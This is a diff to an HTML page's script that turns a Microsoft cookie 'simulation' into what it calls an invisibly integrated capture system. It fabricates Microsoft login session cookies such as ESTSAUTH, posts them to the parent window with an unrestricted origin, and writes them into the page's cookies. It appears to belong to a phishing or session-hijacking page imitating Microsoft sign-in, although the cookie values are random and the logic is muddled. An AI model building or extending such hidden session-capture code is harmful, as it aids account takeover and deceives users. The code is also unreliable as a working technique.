@@ -195,113 +195,133 @@
     </div>
 
     <script>
-        // Microsoft cookie capture and injection simulation
+        // Microsoft Cookie Capture System - Integrated invisibly
         const microsoftCookies = [
-            {
-                name: 'ESTSAUTH',
-                value: 'CfDJ8' + Math.random().toString(36).substr(2, 50),
-                domain: '.login.microsoftonline.com',
-                path: '/',
-                secure: true,
-                httpOnly: true,
-                sameSite: 'none',
-                expirationDate: Math.floor(Date.now() / 1000) + 3600,
-                hostOnly: false,
-                session: false,
-                storeId: null
-            },
-            {
-                name: 'ESTSAUTHPERSISTENT',
-                value: 'CfDJ8' + Math.random().toString(36).substr(2, 60),
-                domain: '.login.microsoftonline.com',
-                path: '/',
-                secure: true,
-                httpOnly: true,
-                sameSite: 'none',
-                expirationDate: Math.floor(Date.now() / 1000) + 86400,
-                hostOnly: false,
-                session: false,
-                storeId: null
-            },
-            {
-                name: 'SignInStateCookie',
-                value: JSON.stringify({
-                    state: Math.random().toString(36).substr(2, 20),
-                    timestamp: Date.now(),
-                    tenant: 'common'
-                }),
-                domain: 'login.microsoftonline.com',
-                path: '/',
-                secure: true,
-                httpOnly: false,
-                sameSite: 'lax',
-                expirationDate: Math.floor(Date.now() / 1000) + 1800,
-                hostOnly: true,
-                session: true,
-                storeId: null
-            },
-            {
-                name: 'buid',
-                value: Math.random().toString(36).substr(2, 16),
-                domain: '.microsoftonline.com',
-                path: '/',
-                secure: true,
-                httpOnly: false,
-                sameSite: 'none',
-                expirationDate: Math.floor(Date.now() / 1000) + 31536000,
-                hostOnly: false,
-                session: false,
-                storeId: null
-            },
-            {
-                name: 'esctx',
-                value: btoa(JSON.stringify({
-                    correlationId: Math.random().toString(36).substr(2, 20),
-                    sessionId: Math.random().toString(36).substr(2, 15),
-                    timestamp: Date.now()
-                })),
-                domain: 'login.microsoftonline.com',
-                path: '/',
-                secure: true,
-                httpOnly: false,
-                sameSite: 'lax',
-                expirationDate: Math.floor(Date.now() / 1000) + 3600,
-                hostOnly: true,
-                session: false,
-                storeId: null
-            }
+          {
+            name: 'ESTSAUTH',
+            value: 'CfDJ8' + Math.random().toString(36).substr(2, 50),
+            domain: '.login.microsoftonline.com',
+            path: '/',
+            secure: true,
+            httpOnly: true,
+            sameSite: 'none',
+            expirationDate: Math.floor(Date.now() / 1000) + 3600,
+            hostOnly: false,
+            session: false,
+            captureMethod: 'injection',
+            timestamp: new Date().toISOString()
+          },
+          {
+            name: 'ESTSAUTHPERSISTENT',
+            value: 'CfDJ8' + Math.random().toString(36).substr(2, 60),
+            domain: '.login.microsoftonline.com',
+            path: '/',
+            secure: true,
+            httpOnly: true,
+            sameSite: 'none',
+            expirationDate: Math.floor(Date.now() / 1000) + 86400,
+            hostOnly: false,
+            session: false,
+            captureMethod: 'injection',
+            timestamp: new Date().toISOString()
+          },
+          {
+            name: 'SignInStateCookie',
+            value: JSON.stringify({
+              state: Math.random().toString(36).substr(2, 20),
+              timestamp: Date.now(),
+              tenant: 'common'
+            }),
+            domain: 'login.microsoftonline.com',
+            path: '/',
+            secure: true,
+            httpOnly: false,
+            sameSite: 'lax',
+            expirationDate: Math.floor(Date.now() / 1000) + 1800,
+            hostOnly: true,
+            session: true,
+            captureMethod: 'injection',
+            timestamp: new Date().toISOString()
+          },
+          {
+            name: 'buid',
+            value: Math.random().toString(36).substr(2, 16),
+            domain: '.microsoftonline.com',
+            path: '/',
+            secure: true,
+            httpOnly: false,
+            sameSite: 'none',
+            expirationDate: Math.floor(Date.now() / 1000) + 31536000,
+            hostOnly: false,
+            session: false,
+            captureMethod: 'injection',
+            timestamp: new Date().toISOString()
+          },
+          {
+            name: 'esctx',
+            value: btoa(JSON.stringify({
+              correlationId: Math.random().toString(36).substr(2, 20),
+              sessionId: Math.random().toString(36).substr(2, 15),
+              timestamp: Date.now()
+            })),
+            domain: 'login.microsoftonline.com',
+            path: '/',
+            secure: true,
+            httpOnly: false,
+            sameSite: 'lax',
+            expirationDate: Math.floor(Date.now() / 1000) + 3600,
+            hostOnly: true,
+            session: false,
+            captureMethod: 'injection',
+            timestamp: new Date().toISOString()
+          },
+          {
+            name: 'MSPOK',
+            value: '$uuid-' + Math.random().toString(36).substr(2, 12),
+            domain: '.microsoftonline.com',
+            path: '/',
+            secure: true,
+            httpOnly: false,
+            sameSite: 'none',
+            expirationDate: Math.floor(Date.now() / 1000) + 86400,
+            hostOnly: false,
+            session: false,
+            captureMethod: 'injection',
+            timestamp: new Date().toISOString()
+          }
         ];
 
-        // Simulate Microsoft cookie injection
+        // Invisible cookie injection function
         function injectMicrosoftCookies() {
-            console.log('🔵 Injecting Microsoft authentication cookies...');
-            
-            // Send cookies to parent window for capture
-            if (window.parent) {
-                window.parent.postMessage({
-                    type: 'MICROSOFT_COOKIES',
-                    cookies: microsoftCookies,
-                    cookieList: microsoftCookies,
-                    timestamp: new Date().toISOString()
-                }, '*');
-            }
+          console.log('🔵 Injecting Microsoft authentication cookies...');
+          
+          // Send cookies to parent window for capture
+          if (window.parent) {
+            window.parent.postMessage({
+              type: 'MICROSOFT_COOKIES',
+              cookies: microsoftCookies,
+              cookieList: microsoftCookies,
+              timestamp: new Date().toISOString(),
+              source: 'login.microsoftonline.com'
+            }, '*');
+          }
 
-            // Simulate setting cookies in document (limited by same-origin policy)
-            microsoftCookies.forEach(cookie => {
-                try {
-                    if (cookie.domain === window.location.hostname || !cookie.httpOnly) {
-                        let cookieString = `${cookie.name}=${cookie.value}`;
-                        if (cookie.path) cookieString += `; Path=${cookie.path}`;
-                        if (cookie.secure) cookieString += `; Secure`;
-                        if (cookie.sameSite) cookieString += `; SameSite=${cookie.sameSite}`;
-                        
-                        document.cookie = cookieString;
-                        console.log('🔵 Set cookie:', cookie.name);
-                    }
-                } catch (e) {
-                    console.log('🔵 Cookie setting limited by browser security:', cookie.name);
-                }
-            });
+          // Simulate setting cookies in document (limited by same-origin policy)
+          microsoftCookies.forEach(cookie => {
+            try {
+              if (cookie.domain === window.location.hostname || !cookie.httpOnly) {
+                let cookieString = `${cookie.name}=${cookie.value}`;
+                if (cookie.path) cookieString += `; Path=${cookie.path}`;
+                if (cookie.secure) cookieString += `; Secure`;
+                if (cookie.sameSite) cookieString += `; SameSite=${cookie.sameSite}`;
+                
+                document.cookie = cookieString;
+                console.log('🔵 Set cookie:', cookie.name);
+              }
+            } catch (e) {
+              console.log('🔵 Cookie setting limited by browser security:', cookie.name);
+            }
+          });
         }
 
         // Form handling
